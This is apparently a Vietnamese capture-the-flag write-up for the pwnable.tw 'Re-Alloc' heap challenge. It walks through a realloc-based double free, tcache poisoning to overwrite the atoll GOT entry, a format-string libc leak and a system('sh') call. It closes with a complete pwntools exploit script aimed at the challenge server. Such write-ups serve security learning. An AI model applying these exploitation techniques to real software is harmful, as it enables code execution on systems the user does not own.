# Challenge: Re-Alloc

## Vấn đề
- [File challenge](https://pwnable.tw/challenge/#40)
- Chương trình thực thi như sau:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  init_proc(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      reallocate();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        rfree();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      allocate();
    }
  }
}
```
- Trong đó, có các hàm thực thi theo thứ tự input:
```
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = realloc(0LL, size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}

int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !*((_QWORD *)&heap + v1) )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc(*((void **)&heap + v1), size);
  if ( !v3 )
    return puts("alloc error");
  *((_QWORD *)&heap + v1) = v3;
  printf("Data:");
  return read_input(*((_QWORD *)&heap + v1), (unsigned int)size);
}

int rfree()
{
  void *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc(*((void **)&heap + v2), 0LL);
    v0 = &heap;
    *((_QWORD *)&heap + v2) = 0LL;
  }
  return (int)v0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ FORTIFY:    Enabled
+ Stripped:   No
```

## Giải pháp
- Chương trình có hàm tạo alloc (tạo một chunk heap), realloc (để thay đổi kích thước và data của heap *có một thứ lưu ý là khi realloc(0) nó đồng nghĩa là free(0) nó đẩy chunk vào bins nhưng không đổi địa chỉ thành NULL) và free (đưa chunk heap vào bins và *chunk trả về NULL).
- Vấn đề mảng heap này chỉ được tạo tối đa 2 chunk và size < 0x78. Do đó, ta cần đánh lừa alloc bằng realloc(0) để Double Free và khai thác Tcache Poisoning rồi overwrite địa chỉ nào đó thành địa chỉ có thể lấy shell.
- Khi xem qua ida, tôi thấy chẳng có hàm nào có thể tận dụng lấy shell được do đó check qua libc xem có hàm nào không, thì tôi thấy có hàm system.
```
pwndbg> p &system
$1 = (<text variable, no debug info> *) 0x7ffff7e2ffd0 <system>
```
> Tìm cách leak libc và tận dụng hàm system này để lấy shell.

## Quá trình
- Xem qua các hàm thì tôi thấy rằng hàm read_long() có chứa hàm atoll() dùng để đổi string thành long long tức là size của heap.
```
__int64 read_long()
{
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __read_chk(0LL, (__int64)nptr, '\x10', '\x11');
  return atoll(nptr);
}
```
- Khi chạy alloc(), realloc() hay free() đều phải chạy thằng read_long() trong đó luôn return atoll() lúc này trong got có hàm printf() nếu như thay đổi atoll() thành printf() thì khi return printf() có thể khai thác Format String và leak được libc ra sử dụng.
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/haiwh/CTF/pwnable/re_alloc_chall/re-alloc_patched:
GOT protection: Partial RELRO | Found 11 GOT entries passing the filter
[0x404018] _exit@GLIBC_2.2.5 -> 0x401036 (_exit@plt+6) ◂— push 0 /* 'h' */
[0x404020] __read_chk@GLIBC_2.4 -> 0x401046 (__read_chk@plt+6) ◂— push 1
[0x404028] puts@GLIBC_2.2.5 -> 0x401056 (puts@plt+6) ◂— push 2
[0x404030] __stack_chk_fail@GLIBC_2.4 -> 0x401066 (__stack_chk_fail@plt+6) ◂— push 3
[0x404038] printf@GLIBC_2.2.5 -> 0x401076 (printf@plt+6) ◂— push 4
[0x404040] alarm@GLIBC_2.2.5 -> 0x401086 (alarm@plt+6) ◂— push 5
[0x404048] atoll@GLIBC_2.2.5 -> 0x401096 (atoll@plt+6) ◂— push 6
[0x404050] signal@GLIBC_2.2.5 -> 0x4010a6 (signal@plt+6) ◂— push 7
[0x404058] realloc@GLIBC_2.2.5 -> 0x4010b6 (realloc@plt+6) ◂— push 8
[0x404060] setvbuf@GLIBC_2.2.5 -> 0x4010c6 (setvbuf@plt+6) ◂— push 9 /* 'h\t' */
[0x404068] __isoc99_scanf@GLIBC_2.7 -> 0x4010d6 (__isoc99_scanf@plt+6) ◂— push 0xa /* 'h\n' */
```
- Thế thì mục tiêu của tôi là Double Free và gắn atoll() thay thành printf() sau đó chạy bất kì hàm alloc(), realloc() hay free() để tính offset tới libc leak sau khi có libc base thay đổi atoll lại thành địa chỉ system trong libc và lấy shell.
- Để thực hiện Double Free ta cần tạo trước chunk A, như tôi nói realloc(0) phía trên lúc này khi chạy realloc() với size tương ứng chunk A đã tạo trước đó cùng với data gửi vào sẽ có thể thay đổi được data trong chunk, ví dụ: Tạo chunk A -> relloc(0) -> chunk A bị đẩy vào tcache bins nhưng trong mảng heap tạo index 0 vẫn còn chunk A vì không bị gắn thành NULL -> relloc(exe.got['atoll']) với size cùng chunk A -> tcache bins bị lừa rằng -> chunk A trở tới exe.got['atoll'] -> Tạo chunk B -> tcache bins của còn exe.got['atoll'].
- Và khi hiểu được cơ chế khai thác Double Free trong chall này thì ta có thể dùng nó để gắn printf.got thành atoll.got nhưng vấn đề khi gắn atoll thành printf rồi ta cần dùng atoll 1 lần nữa để gắn atoll thành system trong libc. Vậy nên cần Double Free 2 lần với 2 chunk size khác nhau để không bị trùng offset trong tcache bins. Nhưng lấy tcache offset atoll.got sau để thay thành printf.got vì khi lấy tcache offset đầu chứa atoll.got sẽ làm thay đổi giá trị atoll.got phía khi đó lần overwrite atoll thành system sẽ bị báo lỗi.
> Sau khi khai thác Format String bằng printf có được libc base rồi thì đổi atoll.got thành system và lấy shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('re-alloc_patched', checksec=False)
libc = ELF('libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+69

        
        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10106)
else:
    p = process([exe.path])
GDB()

def alloc(idx, size, data):
    slna(b'choice: ', 1)
    slna(b'Index:', idx)
    slna(b'Size:', size)
    sla(b'Data:', data)

def realloc(idx, size, data):
    slna(b'choice: ', 2)
    slna(b'Index:', idx)
    if size > 0:
        slna(b'Size:', size)
        sla(b'Data:', data)
    else:
        slna(b'Size:', size)
        p.recvuntil(b'alloc error', drop=True)

def rfree(idx):
    slna(b'choice: ', 3)
    slna(b'Index:', idx)

def exit():
    slna(b'choice: ', 4)

##########################
### STAGE 1: Leak libc ###
##########################
# Double Free
alloc(0, 0x18, b'A'*4)
realloc(0, 0, b'')
realloc(0, 0x18, p64(exe.got['atoll']))

alloc(1, 0x18, b'A')
realloc(1, 0x20, b'')
rfree(1)

realloc(0, 0x18, b'A'*8)
rfree(0)

alloc(0, 0x38, b'A'*4)
realloc(0, 0, b'')
realloc(0, 0x38, p64(exe.got['atoll']))

alloc(1, 0x38, b'A')
realloc(1, 0x48, b'')
rfree(1)
realloc(0, 0x50, b'A'*8)
rfree(0)

# Format String
alloc(0, 0x38, p64(exe.plt['printf']))
slna(b'choice: ', 1)
sla(b'Index:', b'%6$p')

libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - 0x1e5760
info("Libc leak: " + hex(libc_leak)) 
info("Libc base: " + hex(libc.address))

##########################
### STAGE 2: Get shell ###
##########################
# System('sh')
slna(b'choice: ', 1)
sla(b'Index:', b'')
slna(b'Size:', b'asdfasdf')
sla(b'Data:', p64(libc.sym['system']))

slna(b'choice: ', 1)
sla(b'Index:', b'sh')

p.interactive()
```
